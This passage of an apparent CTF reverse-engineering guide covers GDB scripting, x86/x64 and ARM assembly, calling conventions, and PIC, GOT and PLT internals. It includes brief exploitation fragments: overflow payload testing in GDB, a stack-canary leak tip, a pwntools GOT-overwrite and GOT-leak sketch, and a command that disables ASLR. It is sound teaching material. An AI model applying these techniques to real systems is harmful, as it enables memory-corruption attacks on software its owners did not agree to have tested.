(gdb) x/16x $rsp
(gdb) info registers
```

Examine where buffer contents overwrite return address or other critical values.

Monitor strcpy vulnerability:

```bash
(gdb) break strcpy@plt
(gdb) run
(gdb) info registers
(gdb) x/s $rdi
(gdb) x/s $rsi
```

Inspect source and destination buffers at vulnerable function call.

Track heap exploitation:

```bash
(gdb) break malloc@plt
(gdb) run
(gdb) continue (through allocations)
(gdb) x/64x 0x0000555555558000
```

[Inference] Monitor chunk metadata and adjacent allocations for heap spray or corruption opportunities.

**GDB Scripting for Automation**

Create breakpoint script:

```bash
cat > commands.gdb << 'EOF'
break main
run arg1
x/64x $rsp
print $rax
continue
EOF

gdb -x commands.gdb ./binary
```

Automate exploitation testing:

```bash
cat > exploit_test.gdb << 'EOF'
break *0x0000555555554680
run < payload.txt
if $rax == 0xdeadbeef
  print "Exploit successful"
else
  print "Exploit failed"
end
quit
EOF

gdb -batch -x exploit_test.gdb ./binary
```

Python scripting within GDB:

```bash
(gdb) python
import subprocess
result = subprocess.run(['objdump', '-d', './binary'], capture_output=True, text=True)
print(result.stdout[:1000])
end
```

**Advanced: GDB with Python Extensions**

Create custom exploitation helper:

```python
import gdb

class ExploitHelper(gdb.Command):
    def __init__(self):
        super(ExploitHelper, self).__init__("exploit", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        rsp = int(gdb.parse_and_eval("$rsp"))
        rip = int(gdb.parse_and_eval("$rip"))
        print(f"RSP: {hex(rsp)}, RIP: {hex(rip)}")

ExploitHelper()
```

Save as `exploit_helper.py` and load in GDB:

```bash
(gdb) python exec(open('exploit_helper.py').read())
(gdb) exploit
```

**ASLR and PIE Handling**

Disable ASLR for reproducible debugging:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gdb ./binary
```

[Inference] Re-enable after: `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`

Extract base addresses with ASLR enabled:

```bash
(gdb) info proc mappings
```

Shows actual memory layout; calculate relative offsets from displayed base addresses.

**Dynamic Binary Instrumentation Alternative: Pin/DynamoRIO**

For advanced runtime analysis beyond GDB capabilities:

```bash
pin -t tool.so -- ./binary arg1
```

[Unverified] Pin allows instruction-level tracing and custom instrumentation; requires external tool installation.

**Linux-Specific Debugging Considerations**

Debug stripped binaries:

```bash
(gdb) file ./binary
(gdb) symbol-file ./binary.debug
```

If debug symbols separated; load explicitly.

Attach to running process:

```bash
gdb -p $(pgrep binary)
```

Trace system calls alongside GDB:

```bash
strace -p $(pgrep gdb)
```

Parallel strace window shows system call activity during GDB session.

Set environment variables:

```bash
(gdb) set environment LD_LIBRARY_PATH /custom/lib/path
(gdb) run
```

Handle signals during debugging:

```bash
(gdb) handle SIGSEGV nostop print pass
```

Continues execution on segfault while printing message; useful for testing exploit handlers.

---

# Assembly Language Deep Dive

Assembly language is the human-readable representation of machine code. Mastery of assembly is essential for CTF reverse engineering, exploit development, and understanding program behavior at the lowest level.

---

## x86/x64 Architecture Overview

### Register Sets

**x86 (32-bit) General Purpose Registers**:

```
EAX - Accumulator (arithmetic, return values)
EBX - Base (base pointer for memory access)
ECX - Counter (loop counters, string operations)
EDX - Data (I/O operations, multiplication/division)
ESI - Source Index (string/array operations)
EDI - Destination Index (string/array operations)
EBP - Base Pointer (stack frame base)
ESP - Stack Pointer (top of stack)
```

**x64 (64-bit) Extensions**:

```
RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP (64-bit versions)
R8-R15 (additional general purpose registers)

Register subdivisions (x64):
RAX (64-bit) → EAX (lower 32) → AX (lower 16) → AH|AL (high/low 8)
Example:
  RAX = 0x0000000012345678
  EAX = 0x12345678
  AX  = 0x5678
  AH  = 0x56, AL = 0x78
```

**Special Registers**:

```
RIP/EIP - Instruction Pointer (current instruction address)
RFLAGS/EFLAGS - Status flags (ZF, SF, CF, OF, etc.)
  ZF (Zero Flag) - Set if result is zero
  SF (Sign Flag) - Set if result is negative
  CF (Carry Flag) - Set on unsigned overflow
  OF (Overflow Flag) - Set on signed overflow
```

---

## Data Movement Instructions

### MOV - Move Data

**Syntax**: `mov destination, source`

```nasm
; Register to register
mov eax, ebx          ; eax = ebx

; Immediate to register
mov ecx, 0x1234       ; ecx = 0x1234

; Memory to register
mov eax, [0x601040]   ; eax = value at address 0x601040
mov rdi, [rbp-0x8]    ; rdi = value at rbp-8 (local variable)

; Register to memory
mov [rsp+0x10], rax   ; Store rax at rsp+16

; AT&T syntax (GCC/objdump):
movl %ebx, %eax       ; eax = ebx (suffix l = long/32-bit)
movq %rax, -8(%rbp)   ; Store rax at rbp-8
```

**Size Suffixes (AT&T)**:

- `movb` - byte (8-bit)
- `movw` - word (16-bit)
- `movl` - long (32-bit)
- `movq` - quad (64-bit)

### LEA - Load Effective Address

**Purpose**: Calculate address without dereferencing.

```nasm
lea rax, [rbx+rcx*4+0x10]  ; rax = rbx + (rcx*4) + 0x10
; Does NOT load memory content, only computes address
; Commonly used for pointer arithmetic

; Example: Array access
lea rdi, [array + rsi*8]   ; rdi = &array[rsi] (8-byte elements)
```

**CTF Usage**: Often disguises arithmetic operations.

```nasm
lea eax, [eax+eax*2]   ; eax = eax * 3 (faster than mul)
```

### MOVSX/MOVZX - Sign/Zero Extension

```nasm
movsx rax, byte [rdi]   ; Sign-extend 8-bit to 64-bit
movzx eax, word [rsi]   ; Zero-extend 16-bit to 32-bit

; Example:
; [rdi] = 0xFF (as signed byte = -1)
movsx rax, byte [rdi]   ; rax = 0xFFFFFFFFFFFFFFFF
movzx rax, byte [rdi]   ; rax = 0x00000000000000FF
```

---

## Arithmetic and Logic Instructions

### Basic Arithmetic

```nasm
; Addition
add eax, ebx          ; eax = eax + ebx
add rax, 0x10         ; rax = rax + 16
adc eax, ebx          ; eax = eax + ebx + CF (add with carry)

; Subtraction
sub eax, ebx          ; eax = eax - ebx
sub rsp, 0x20         ; Allocate 32 bytes on stack
sbb eax, ebx          ; eax = eax - ebx - CF (subtract with borrow)

; Increment/Decrement
inc ecx               ; ecx++
dec edx               ; edx--

; Negation
neg eax               ; eax = -eax (two's complement)
```

### Multiplication and Division

```nasm
; Unsigned multiplication
mul ebx               ; EDX:EAX = EAX * EBX (32-bit)
mul rcx               ; RDX:RAX = RAX * RCX (64-bit)

; Signed multiplication
imul ebx              ; EDX:EAX = EAX * EBX (signed)
imul eax, ebx, 5      ; eax = ebx * 5
imul rax, [rbp-0x8]   ; rax = rax * [rbp-8]

; Unsigned division
div ebx               ; EAX = EDX:EAX / EBX (quotient)
                      ; EDX = EDX:EAX % EBX (remainder)

; Signed division
idiv ebx              ; Signed version
xor edx, edx          ; Clear EDX before div (common pattern)
div ebx
```

### Bitwise Operations

```nasm
; AND (mask bits)
and eax, 0xFF         ; Keep only lower 8 bits
and rax, rax          ; Test if rax is zero (sets flags)

; OR (set bits)
or eax, 0x80          ; Set bit 7
or rax, rax           ; Test if rax is zero (common idiom)

; XOR (toggle bits, clear register)
xor eax, eax          ; eax = 0 (efficient zero initialization)
xor eax, 0x12345678   ; Toggle specific bits

; NOT (invert all bits)
not eax               ; eax = ~eax

; Shifts
shl eax, 2            ; Logical left shift (eax *= 4)
shr eax, 1            ; Logical right shift (eax /= 2, unsigned)
sal eax, 3            ; Arithmetic left shift (same as shl)
sar eax, 2            ; Arithmetic right shift (preserves sign bit)

; Rotates
rol eax, 4            ; Rotate left 4 bits
ror eax, 8            ; Rotate right 8 bits (common in crypto)
```

---

## Control Flow Instructions

### Unconditional Jumps

```nasm
jmp target            ; Jump to target address
jmp rax               ; Indirect jump (jump to address in rax)
jmp [rax]             ; Jump to address stored at [rax]

; Example: Infinite loop
loop_start:
  ; ... code ...
  jmp loop_start
```

### Conditional Jumps

**Comparison**: `cmp operand1, operand2` (performs `operand1 - operand2`, sets flags)

```nasm
cmp eax, ebx          ; Compare eax with ebx
je equal_label        ; Jump if equal (ZF=1)
jne not_equal         ; Jump if not equal (ZF=0)
jg greater            ; Jump if greater (signed)
jl less               ; Jump if less (signed)
jge greater_equal     ; Jump if greater or equal (signed)
jle less_equal        ; Jump if less or equal (signed)
ja above              ; Jump if above (unsigned)
jb below              ; Jump if below (unsigned)
jae above_equal       ; Jump if above or equal (unsigned)
jbe below_equal       ; Jump if below or equal (unsigned)
```

**Flag-Based Jumps**:

```nasm
test eax, eax         ; Bitwise AND, sets flags (common for null check)
jz zero_label         ; Jump if zero (ZF=1)
jnz not_zero          ; Jump if not zero (ZF=0)
js negative           ; Jump if sign flag set (SF=1)
jns positive          ; Jump if sign flag not set (SF=0)
jo overflow_occurred  ; Jump if overflow (OF=1)
```

### Conditional Move (CMOV)

**Purpose**: Avoid branch misprediction penalties.

```nasm
cmp eax, ebx
cmove ecx, edx        ; ecx = edx if equal (ZF=1)
cmovne ecx, edx       ; ecx = edx if not equal
cmovg ecx, edx        ; ecx = edx if greater (signed)
```

[Inference] Modern compilers use CMOV to optimize simple conditionals without branching.

### TEST Instruction

**Purpose**: Bitwise AND without storing result (only sets flags).

```nasm
test eax, eax         ; Check if eax is zero
jz eax_is_zero        ; Jump if ZF=1

test al, 1            ; Check if lowest bit is set
jnz bit_set           ; Jump if odd number

test rax, rax         ; Common idiom for null pointer check
jz null_ptr
```

---

## Stack Operations

### Stack Fundamentals

**Stack Growth**: Grows downward (high addresses → low addresses).

```
High Memory
    ↑
[older data]
[rbp-0x10]
[rbp-0x8]
[rbp]       ← Base Pointer (frame start)
[rbp+0x8]   ← Return address
[rbp+0x10]  ← Function arguments (in some conventions)
    ↓
Low Memory  ← Stack Pointer (rsp/esp)
```

### PUSH and POP

```nasm
; PUSH (decrement rsp, then store)
push rax              ; rsp -= 8; [rsp] = rax (x64)
push 0x1234           ; Push immediate value

; Equivalent to:
sub rsp, 8
mov [rsp], rax

; POP (load, then increment rsp)
pop rbx               ; rbx = [rsp]; rsp += 8

; Equivalent to:
mov rbx, [rsp]
add rsp, 8
```

**Multiple Push/Pop**:

```nasm
push rbp
push rbx
push r12
; ... function body ...
pop r12
pop rbx
pop rbp
```

### Stack Frame Setup (Function Prologue)

```nasm
; Standard x64 prologue
push rbp              ; Save old frame pointer
mov rbp, rsp          ; Establish new frame pointer
sub rsp, 0x20         ; Allocate 32 bytes for local variables

; Local variable access:
mov [rbp-0x8], rax    ; Store at local var 1
mov [rbp-0x10], rbx   ; Store at local var 2
```

### Stack Frame Teardown (Function Epilogue)

```nasm
; Standard epilogue
mov rsp, rbp          ; Restore stack pointer
pop rbp               ; Restore old frame pointer
ret                   ; Return to caller

; Or using LEAVE instruction:
leave                 ; Equivalent to: mov rsp, rbp; pop rbp
ret
```

---

## Calling Conventions

### x64 Linux/Unix (System V AMD64 ABI)

**Argument Passing**:

```
1st arg:  RDI
2nd arg:  RSI
3rd arg:  RDX
4th arg:  RCX
5th arg:  R8
6th arg:  R9
7+ args:  Stack (right-to-left)
```

**Return Value**: RAX (integer/pointer), XMM0 (floating-point)

**Callee-Saved Registers**: RBX, RBP, R12-R15 (must be preserved)

**Caller-Saved Registers**: RAX, RCX, RDX, RSI, RDI, R8-R11 (may be clobbered)

**Example Call**:

```nasm
; Call function(0x10, 0x20, 0x30)
mov rdi, 0x10         ; 1st argument
mov rsi, 0x20         ; 2nd argument
mov rdx, 0x30         ; 3rd argument
call function
; Return value in rax
```

### x64 Windows (Microsoft x64)

**Argument Passing**:

```
1st arg:  RCX
2nd arg:  RDX
3rd arg:  R8
4th arg:  R9
5+ args:  Stack
```

**Shadow Space**: Caller must allocate 32 bytes (0x20) on stack before call.

```nasm
sub rsp, 0x28         ; 32-byte shadow + 8-byte alignment
mov rcx, arg1
mov rdx, arg2
call function
add rsp, 0x28
```

**Callee-Saved**: RBX, RBP, RDI, RSI, RSP, R12-R15

### x86 (32-bit) Calling Conventions

**cdecl (Default C)**: Arguments pushed right-to-left, caller cleans stack.

```nasm
; Call function(10, 20, 30)
push 30               ; 3rd arg
push 20               ; 2nd arg
push 10               ; 1st arg
call function
add esp, 12           ; Caller cleans stack (3 args * 4 bytes)
```

**stdcall (WinAPI)**: Arguments right-to-left, **callee** cleans stack.

```nasm
push 30
push 20
push 10
call function         ; Function pops arguments before ret
; No stack cleanup needed by caller
```

**fastcall**: First 2 args in ECX, EDX; rest on stack.

```nasm
mov ecx, 10           ; 1st arg
mov edx, 20           ; 2nd arg
push 30               ; 3rd arg
call function
add esp, 4            ; Clean 3rd arg only
```

---

## Function Calls Deep Dive

### CALL Instruction

**Behavior**:

1. Push return address (RIP/EIP) onto stack
2. Jump to target address

```nasm
call function         ; push rip; jmp function

; Equivalent to:
push rip
jmp function
```

**Indirect Calls**:

```nasm
call rax              ; Call function pointer in rax
call [rax]            ; Call function at address stored in [rax]
call [rip+offset]     ; Position-independent call (PIE binaries)
```

### RET Instruction

**Behavior**:

1. Pop return address from stack
2. Jump to that address

```nasm
ret                   ; pop rip; jmp rip

; Return with stack cleanup (stdcall):
ret 0x10              ; pop rip; add rsp, 0x10; jmp rip
```

### Stack Alignment

**x64 ABI Requirement**: RSP must be 16-byte aligned before CALL.

```nasm
; Before function call:
sub rsp, 8            ; Ensure 16-byte alignment
call function
add rsp, 8

; Prologue often allocates multiples of 16:
sub rsp, 0x20         ; 32 bytes (16-byte aligned)
```

[Inference] Misalignment causes crashes in SSE/AVX instructions that expect aligned memory.

---

## Control Flow Patterns

### If-Else Statement

**C Code**:

```c
if (x > 10) {
    y = 5;
} else {
    y = 0;
}
```

**Assembly**:

```nasm
cmp dword [x], 10
jle else_branch
; If body
mov dword [y], 5
jmp end_if
else_branch:
; Else body
mov dword [y], 0
end_if:
; Continue...
```

### While Loop

**C Code**:

```c
int i = 0;
while (i < 10) {
    sum += i;
    i++;
}
```

**Assembly**:

```nasm
mov ecx, 0            ; i = 0
loop_start:
cmp ecx, 10
jge loop_end          ; Exit if i >= 10
add [sum], ecx        ; sum += i
inc ecx               ; i++
jmp loop_start
loop_end:
```

### For Loop

**C Code**:

```c
for (int i = 0; i < 10; i++) {
    array[i] = i * 2;
}
```

**Assembly**:

```nasm
xor ecx, ecx          ; i = 0
for_loop:
cmp ecx, 10
jge for_end
lea rax, [array]
mov [rax+rcx*4], ecx  ; array[i] = i (4-byte ints)
shl dword [rax+rcx*4], 1  ; Multiply by 2
inc ecx
jmp for_loop
for_end:
```

### Switch Statement

**Method 1: Jump Table**

**C Code**:

```c
switch (x) {
    case 0: return 10;
    case 1: return 20;
    case 2: return 30;
    default: return 0;
}
```

**Assembly**:

```nasm
mov eax, [x]
cmp eax, 2
ja default_case       ; x > 2, use default
lea rdx, [jump_table]
jmp [rdx+rax*8]       ; Jump to jump_table[x]

case_0:
mov eax, 10
ret
case_1:
mov eax, 20
ret
case_2:
mov eax, 30
ret
default_case:
xor eax, eax
ret

; Data section:
jump_table:
dq case_0
dq case_1
dq case_2
```

**Method 2: If-Else Chain** (for sparse cases)

```nasm
cmp eax, 0
je case_0
cmp eax, 1
je case_1
; ... etc
jmp default_case
```

---

## Advanced Stack Techniques

### Stack Canaries (Detection)

```nasm
; Function prologue with canary
mov rax, [fs:0x28]    ; Load canary from TLS (x64 Linux)
mov [rbp-0x8], rax    ; Store on stack

; Function epilogue
mov rax, [rbp-0x8]
xor rax, [fs:0x28]    ; Compare with original
jne __stack_chk_fail  ; Abort if mismatch
```

**CTF Bypass**: Leak canary value before overflow, include it in exploit payload.

### Alloca (Dynamic Stack Allocation)

```nasm
; int array[n]; (variable-length array)
mov eax, [n]
shl eax, 2            ; n * 4 (sizeof(int))
sub rsp, rax          ; Allocate n*4 bytes
; Access via [rsp+offset]
```

### Tail Call Optimization

```nasm
; Normal call:
call function
ret

; Tail call (no new stack frame):
jmp function          ; Reuse current frame
```

[Inference] Compilers use tail calls to optimize recursive functions into loops.

---

## Common Assembly Idioms

### Zero a Register

```nasm
xor eax, eax          ; Fastest (2 bytes, 1 cycle)
mov eax, 0            ; Slower (5 bytes)
sub eax, eax          ; Alternative (2 bytes)
```

### Set Register to -1

```nasm
or eax, -1            ; 0xFFFFFFFF
mov eax, -1           ; Same result
```

### Swap Registers (Without Temp)

```nasm
xor eax, ebx
xor ebx, eax
xor eax, ebx          ; eax and ebx swapped
```

### Multiply by Power of 2

```nasm
shl eax, 3            ; eax *= 8 (faster than imul)
lea eax, [eax*8]      ; Alternative
```

### Check Even/Odd

```nasm
test al, 1            ; Check lowest bit
jz even_number        ; Jump if even (ZF=1)
```

### Clear High Bits

```nasm
movzx eax, al         ; Zero-extend 8-bit AL to 32-bit EAX
and eax, 0xFF         ; Alternative (mask)
```

---

## Position-Independent Code (PIE)

### RIP-Relative Addressing (x64)

```nasm
; Non-PIE (absolute address):
mov rax, [0x601040]

; PIE (relative to RIP):
mov rax, [rip+0x200f6e]  ; Load from RIP+offset
lea rdi, [rip+message]   ; Get address of string

; Data section:
message: db "Hello", 0
```

**CTF Implication**: PIE binaries randomize base address (ASLR), but relative offsets remain constant.

---

## Flag Register Details

### EFLAGS/RFLAGS Bits

```
Bit  Flag  Name              Purpose
0    CF    Carry Flag        Unsigned overflow
2    PF    Parity Flag       Even number of set bits
4    AF    Auxiliary Carry   BCD arithmetic
6    ZF    Zero Flag         Result is zero
7    SF    Sign Flag         Result is negative
8    TF    Trap Flag         Single-step debugging
9    IF    Interrupt Flag    Interrupts enabled
10   DF    Direction Flag    String operation direction
11   OF    Overflow Flag     Signed overflow
```

### Flag Manipulation

```nasm
stc                   ; Set CF
clc                   ; Clear CF
cld                   ; Clear DF (forward string ops)
std                   ; Set DF (backward string ops)
pushf                 ; Push flags to stack
popf                  ; Pop flags from stack
```

---

## String Operations

### Move String

```nasm
cld                   ; Direction: forward (DF=0)
mov rcx, 10           ; Count = 10
rep movsb             ; Repeat: [rdi++] = [rsi++], rcx--

; Equivalent to:
memcpy(rdi, rsi, 10);
```

### Compare String

```nasm
mov rcx, 8
repe cmpsb            ; Compare while equal, max 8 bytes
jne strings_differ
```

### Store String

```nasm
mov al, 0             ; Value to store
mov rcx, 100
rep stosb             ; Repeat: [rdi++] = al, rcx--

; Equivalent to:
memset(rdi, 0, 100);
```

### Scan String

```nasm
mov al, 0             ; Search for null terminator
mov rcx, -1           ; Max length
repne scasb           ; Scan while not equal
; RCX now contains -(string_length+1)
```

---

## Registers and Flags

### x86/x86_64 Register Architecture

#### General Purpose Registers (GPRs)

**x86 (32-bit) Registers:**

- **EAX** (Accumulator) - arithmetic operations, function return values
- **EBX** (Base) - base pointer for memory access
- **ECX** (Counter) - loop counters, string/shift operations
- **EDX** (Data) - I/O operations, arithmetic extensions (multiplication/division overflow)
- **ESI** (Source Index) - source pointer for string operations
- **EDI** (Destination Index) - destination pointer for string operations
- **EBP** (Base Pointer) - stack frame base pointer
- **ESP** (Stack Pointer) - current stack top pointer

**x86_64 (64-bit) Extensions:**

- **RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP** - 64-bit extensions of 32-bit registers
- **R8-R15** - additional 64-bit general purpose registers

**Register Access Variations:**

```
RAX (64-bit)  [bits 0-63]
├── EAX (32-bit) [bits 0-31]
    ├── AX (16-bit) [bits 0-15]
        ├── AH (8-bit) [bits 8-15]
        └── AL (8-bit) [bits 0-7]
```

#### Segment Registers

- **CS** (Code Segment) - points to code segment
- **DS** (Data Segment) - points to data segment
- **SS** (Stack Segment) - points to stack segment
- **ES, FS, GS** - extra segment registers (FS/GS commonly used for TLS in x64)

#### Special Purpose Registers

- **EIP/RIP** (Instruction Pointer) - address of next instruction
- **EFLAGS/RFLAGS** - status and control flags

### EFLAGS Register Breakdown

**Critical Flags for Reverse Engineering:**

|Flag|Bit|Name|Purpose|Set When|
|---|---|---|---|---|
|CF|0|Carry Flag|Unsigned overflow|Arithmetic carries/borrows|
|PF|2|Parity Flag|Even parity|Low byte has even number of 1s|
|AF|4|Auxiliary Carry|BCD arithmetic|Carry from bit 3 to 4|
|ZF|6|Zero Flag|Result is zero|Operation produces zero|
|SF|7|Sign Flag|Sign of result|MSB is 1 (negative in signed)|
|TF|8|Trap Flag|Single-step debugging|Enable single-step mode|
|IF|9|Interrupt Flag|Interrupt enable|Interrupts allowed|
|DF|10|Direction Flag|String operation direction|String ops decrement (1) or increment (0)|
|OF|11|Overflow Flag|Signed overflow|Signed arithmetic overflow|

**Flag Inspection in GDB:**

```bash
# View all flags
info registers eflags

# Examine specific flag states
p/t $eflags    # Binary representation

# Common flag patterns
# ZF=1, CF=0 after CMP when equal
# SF≠OF when signed less than
```

**Common Flag-Setting Instructions:**

```nasm
CMP eax, ebx    ; Sets flags based on (eax - ebx) without storing
TEST eax, eax   ; Sets flags based on (eax & eax), checks if zero
AND eax, ebx    ; Sets ZF, SF, PF; clears CF, OF
```

### ARM Register Architecture

**ARM32 Registers:**

- **R0-R3** - argument passing and return values
- **R4-R11** - general purpose (callee-saved)
- **R12 (IP)** - intra-procedure call scratch register
- **R13 (SP)** - stack pointer
- **R14 (LR)** - link register (return address)
- **R15 (PC)** - program counter
- **CPSR** - Current Program Status Register (flags)

**ARM64 (AArch64) Registers:**

- **X0-X7** - argument/result registers (64-bit)
- **X8** - indirect result location
- **X9-X15** - temporary registers
- **X16-X17 (IP0, IP1)** - intra-procedure call registers
- **X18** - platform register
- **X19-X28** - callee-saved registers
- **X29 (FP)** - frame pointer
- **X30 (LR)** - link register
- **SP** - stack pointer
- **PC** - program counter (implicit)

## Function Prologue/Epilogue

### x86_64 Standard Prologue

**Typical Function Entry:**

```nasm
push rbp              ; Save old base pointer
mov rbp, rsp          ; Establish new stack frame
sub rsp, 0x20         ; Allocate local variables (32 bytes)
```

**Stack Frame Layout After Prologue:**

```
High Address
+------------------+
| Return Address   | RBP + 8
+------------------+
| Saved RBP        | RBP (current frame base)
+------------------+
| Local Var 1      | RBP - 8
+------------------+
| Local Var 2      | RBP - 16
+------------------+
| ...              |
+------------------+
| Alignment/Temp   | RSP (current stack top)
+------------------+
Low Address
```

**Standard Epilogue:**

```nasm
leave                 ; Equivalent to: mov rsp, rbp; pop rbp
ret                   ; Pop return address into RIP
```

### x86 (32-bit) Calling Conventions

**cdecl (default for C):**

```nasm
; Caller responsibilities
push arg3             ; Push arguments right-to-left
push arg2
push arg1
call function
add esp, 12           ; Caller cleans up stack (3 args × 4 bytes)

; Callee prologue/epilogue same as x64
```

**stdcall (Windows API):**

```nasm
; Callee cleans stack
ret 12                ; Pop 12 bytes of arguments on return
```

**fastcall:**

- First 2 arguments in ECX, EDX (x86)
- Remaining arguments on stack

### x86_64 System V ABI (Linux)

**Argument Passing Order:**

1. RDI - 1st integer/pointer argument
2. RSI - 2nd integer/pointer argument
3. RDX - 3rd integer/pointer argument
4. RCX - 4th integer/pointer argument
5. R8 - 5th integer/pointer argument
6. R9 - 6th integer/pointer argument
7. Stack - 7th+ arguments (pushed right-to-left)

**Return Values:**

- RAX - primary return value
- RDX - secondary return (for 128-bit values)

**Callee-Saved Registers:**

- RBX, RBP, R12-R15 must be preserved

**Example Function Analysis:**

```nasm
; Function: int calculate(int a, int b, int c)
calculate:
    push rbp
    mov rbp, rsp
    ; EDI = a (1st arg)
    ; ESI = b (2nd arg)  
    ; EDX = c (3rd arg)
    mov eax, edi        ; eax = a
    add eax, esi        ; eax = a + b
    imul eax, edx       ; eax = (a + b) * c
    pop rbp
    ret
```

### x86_64 Microsoft x64 (Windows)

**Argument Passing:**

1. RCX - 1st argument
2. RDX - 2nd argument
3. R8 - 3rd argument
4. R9 - 4th argument
5. Stack - 5th+ arguments

**Shadow Space:**

- Caller must allocate 32 bytes (0x20) on stack for register arguments
- Callee can use this space to spill register parameters

```nasm
; Windows x64 prologue
sub rsp, 0x28         ; 32 bytes shadow + 8 bytes alignment
; function body
add rsp, 0x28
ret
```

### ARM32 AAPCS Prologue/Epilogue

**Standard Prologue:**

```arm
push {r4, r5, r6, r7, lr}   ; Save callee-saved regs + return addr
sub sp, sp, #0x10           ; Allocate local variables
```

**Epilogue:**

```arm
add sp, sp, #0x10           ; Deallocate locals
pop {r4, r5, r6, r7, pc}    ; Restore regs, return via PC
```

### ARM64 Prologue/Epilogue

**Standard Prologue:**

```arm64
stp x29, x30, [sp, #-0x20]! ; Push FP and LR, pre-decrement
mov x29, sp                  ; Set frame pointer
```

**Epilogue:**

```arm64
ldp x29, x30, [sp], #0x20   ; Pop FP and LR, post-increment
ret                          ; Return via X30 (LR)
```

### Optimized/Non-Standard Prologues

**Leaf Functions (no calls to other functions):**

```nasm
; May omit frame pointer entirely
sub rsp, 0x10         ; Direct stack allocation
; No push rbp / mov rbp, rsp
```

**Frame Pointer Omission (-fomit-frame-pointer):**

- RBP used as general-purpose register
- Stack offsets calculated from RSP
- Harder to analyze, complicates stack unwinding

**Identifying in Ghidra:**

- Look for missing `push rbp; mov rbp, rsp` pattern
- All local variable references use RSP-relative addressing

## Position-Independent Code (PIC)

### What is PIC?

Position-Independent Code executes correctly regardless of its absolute memory address. Critical for:

- Shared libraries (.so files on Linux)
- ASLR (Address Space Layout Randomization) compatibility
- Shellcode development
- Modern exploit techniques

### Global Offset Table (GOT)

**Purpose:**

- Stores absolute addresses of global variables and functions
- Populated at runtime by dynamic linker
- Enables PIC to access global data

**GOT Structure:**

```
.got (read-only after relocation)
├── GOT[0]: Address of .dynamic section
├── GOT[1]: Link_map pointer
├── GOT[2]: _dl_runtime_resolve address
└── GOT[3+]: Global variable addresses

.got.plt (writable, lazy binding)
├── GOT.PLT[0]: Address of .dynamic
├── GOT.PLT[1]: Link_map pointer  
├── GOT.PLT[2]: _dl_runtime_resolve
└── GOT.PLT[3+]: Function addresses (initially PLT resolver)
```

### Procedure Linkage Table (PLT)

**Purpose:**

- Implements lazy binding for external functions
- First call resolves actual function address
- Subsequent calls jump directly to resolved address

**PLT Stub Pattern:**

```nasm
; PLT entry for printf@plt
printf@plt:
    jmp [printf@got.plt]        ; Jump to GOT entry
    push 0                      ; Index for resolver
    jmp PLT0                    ; Jump to resolver

; On first call:
; 1. GOT contains address of next instruction (push 0)
; 2. Resolver finds real printf address
; 3. Updates GOT with real address
; 4. Subsequent calls jump directly to printf
```

### PIC Code Generation Techniques

#### x86_64 RIP-Relative Addressing

**Direct Addressing (non-PIC):**

```nasm
mov rax, [global_var]   ; Absolute address required
```

**RIP-Relative Addressing (PIC):**

```nasm
mov rax, [rip + offset] ; Offset from current instruction
; Example: mov rax, [rip + 0x2004]
```

**Analyzing in objdump:**

```bash
objdump -d -M intel binary | grep "rip"
# Look for [rip+0x...] addressing patterns
```

#### x86 PIC (32-bit)

**Thunk Pattern for Getting PC:**

```nasm
call __x86.get_pc_thunk.bx
__x86.get_pc_thunk.bx:
    mov ebx, [esp]       ; EBX = return address (current PC)
    ret

; After thunk:
add ebx, OFFSET_TO_GOT   ; EBX now points to GOT
mov eax, [ebx + var_offset]  ; Access global via GOT
```

**GOT Access Pattern:**

```nasm
; Function call through GOT
call __x86.get_pc_thunk.bx
add ebx, 0x1234          ; EBX = GOT base
call [ebx + printf@GOT]  ; Indirect call through GOT
```

### ARM PIC Techniques

**ARM32 PIC:**

```arm
ldr r3, .L_GOT          ; Load GOT offset
add r3, pc, r3          ; R3 = GOT address
ldr r0, [r3, #offset]   ; Load from GOT

.L_GOT:
    .word _GLOBAL_OFFSET_TABLE_ - (.L_PC + 8)
```

**ARM64 ADRP/LDR Pattern:**

```arm64
adrp x0, :got:symbol     ; Load page address of GOT entry
ldr x0, [x0, :got_lo12:symbol]  ; Load from GOT entry
```

### Identifying PIC in Binaries

**Using readelf:**

```bash
# Check for PIC compilation
readelf -h binary | grep "Type:"
# Output: Type: DYN (Shared object file) indicates PIC

# View relocations
readelf -r binary
# Look for R_X86_64_GLOB_DAT, R_X86_64_JUMP_SLOT

# Check dynamic section
readelf -d binary | grep FLAGS
# BIND_NOW means no lazy binding
```

**Using checksec:**

```bash
checksec --file=binary
# Look for: PIE enabled
```

**In IDA Pro/Ghidra:**

- PIC functions show GOT/PLT references
- External function calls go through PLT stubs
- Global variable accesses use RIP-relative addressing

### PIC vs PIE

**PIC (Position-Independent Code):**

- Code can execute at any address
- Used in shared libraries

**PIE (Position-Independent Executable):**

- PIC applied to executables
- Enables full ASLR for main executable
- Binary type: `DYN` instead of `EXEC`

**Checking PIE:**

```bash
# Method 1: readelf
readelf -h binary | grep Type
# ET_DYN = PIE, ET_EXEC = non-PIE

# Method 2: file command
file binary
# "shared object" suggests PIE
# "executable" suggests non-PIE [Inference - output format varies]
```

### Exploiting PIC/PIE Binaries

**GOT Overwrite Attack:**

```python
# Overwrite GOT entry to hijack control flow
# Target: printf@got.plt
# Technique: Write arbitrary address to GOT entry

# In pwntools
elf = ELF('./binary')
got_printf = elf.got['printf']
# Overwrite got_printf with system address
```

**Leaking Addresses from GOT:**

```python
# GOT contains library addresses after resolution
# Leak GOT entry to defeat ASLR
payload = p64(printf_plt) + p64(pop_rdi) + p64(got_printf) + p64(puts_plt)
```

## Important Related Topics

**Advanced Calling Conventions:** Vectorcall (SIMD), thiscall (C++), interrupts and syscall mechanisms

**Stack Canaries and Prologue Modifications:** How stack protections alter standard prologues, canary checking epilogues

**Exception Handling Frames:** `.eh_frame`, SEH (Windows), unwind tables and their role in exploitation

**RELRO (Relocation Read-Only):** Full vs Partial RELRO impact on GOT overwrites, analyzing with readelf

**Dynamic Linking Internals:** `_dl_runtime_resolve`, `link_map` structures, ret2dlresolve techniques

---

# Common Protections & Obfuscation

## Address Space Layout Randomization (ASLR)

**Purpose**: Randomizes memory base addresses (heap, stack, libraries, executable) at each process startup. Defeats exploitation techniques relying on hardcoded addresses, forcing attackers to either leak addresses or use position-independent gadgets.

**ASLR Implementation Details**

Randomization targets:

- **Stack base**: Random offset applied to stack pointer initialization
- **Heap base**: malloc arena base randomized
- **Library base addresses**: All dynamically linked libraries loaded at random offsets
